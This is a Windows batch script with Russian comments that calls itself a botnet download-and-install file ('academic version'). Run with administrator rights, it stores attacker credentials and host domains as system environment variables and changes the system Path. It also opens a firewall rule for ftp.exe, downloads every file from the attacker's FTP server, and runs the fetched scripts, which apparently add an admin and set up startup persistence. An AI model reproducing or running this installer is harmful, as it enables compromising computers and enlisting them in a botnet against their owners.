rem Файл загрузки и установки ботнета (Академический вариант)
rem USAGE
rem > load.cmd <username> <password> <hacker host server 1 domain> <hacker host server 2 domain>
rem Запускать файл с правами администратора

rem Инициализируем переменные окружения скрипта

SetLocal EnableExtensions EnableDelayedExpansion
set KeyVars=HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment

rem удаляем файл pub1.exe
del /f /q c:\pub1.exe

:: Регистрируем каталог ботнета
set PUB1=C:\pub1
Reg Add "%KeyVars%" /v PUB1 /t REG_SZ /d "!PUB1!" /f

:: Указываем добавляемый каталог
set FolderToAdd=%PUB1%\Util

:: Получаем текущее значение Path
For /f "tokens=2*" %%a In ('Reg.exe query "%KeyVars%" /v Path^|Find "Path"') do set "CurPath=%%~b"

:: Дописываем новый каталог
reg.exe add "%KeyVars%" /v Path /t REG_EXPAND_SZ /d "!CurPath!;!FolderToAdd!" /F

rem создаём системные переменные Windows для ботнета
set Hacker_User=%1
set Hacker_Pass=%2
set Hacker_host1=%3
set Hacker_host2=%4

Reg Add "%KeyVars%" /v Hacker_User /t REG_SZ /d "!Hacker_User!" /f
Reg Add "%KeyVars%" /v Hacker_Pass /t REG_SZ /d "!Hacker_Pass!" /f
Reg Add "%KeyVars%" /v Hacker_host1 /t REG_SZ /d "!Hacker_host1!" /f
Reg Add "%KeyVars%" /v Hacker_host2 /t REG_SZ /d "!Hacker_host2!" /f

rem Переходим в корневой каталог на диске C:
c:
cd \
rem создаём каталог на диске C:
md pub1
cd pub1
md Util
cd Util

::Временный файл команд для утилиты FTP.exe
set CommFTP="c:\pub1\Initial_Script.txt"


rem Разрешаем все протоколы для ftp.exe в брандмауэре
netsh advfirewall firewall add rule name="FTP.EXE Application" dir=in action=allow program="%windir%\system32\ftp.exe" enable=yes
rem Определяем переменные:
rem FTP Host
set host=%Hacker_host1%
rem FTP Port
set port=21
rem Ftp User
set user=Anonymous
rem FTP Password
set password=
rem Основная папка
set Mainfolder=
rem Папка внутри FTP архива
set SubFolder=Util
rem Папка внутри FTP архива
set SubFolder1=
rem Маска для файлов
set fileMask=*
rem Локальный каталог
set LocalFolder=%PUB1%\Util\
 
 
::Генерируем файл FTP команд
> %CommFTP% (
  echo open %host% %port%
  echo %user%
  echo.%password%
  echo binary
  echo prompt
  echo hash
  echo lcd "%LocalFolder%"
  if "%Mainfolder%" neq "" echo cd "%Mainfolder%"
  if "%SubFolder%" neq "" echo cd "%SubFolder%"
  if "%SubFolder1%" neq "" echo cd "%SubFolder1%"
  echo mget %fileMask%
  echo disconnect
  echo quit
)

::Запускаем на выполнение пакетник команд FTP

ftp.exe -s:%CommFTP%

::Удаляем пакетник
del /f /q %CommFTP%

rem Постобработка файла

:: Эта команда содержит API для обновления пользовательских настроек Path (только Vista+)
setx temp "%temp%"
:: для XP
rundll32 user32.dll,UpdatePerUserSystemParameters

rem Переходим в начальный каталог
C:
cd %PUB1%\Util

call adAdmin.bat
call onload_regedit.bat
call onsysload.cmd

rem The End
netsh advfirewall firewall delete rule name="FTP.EXE Application"
0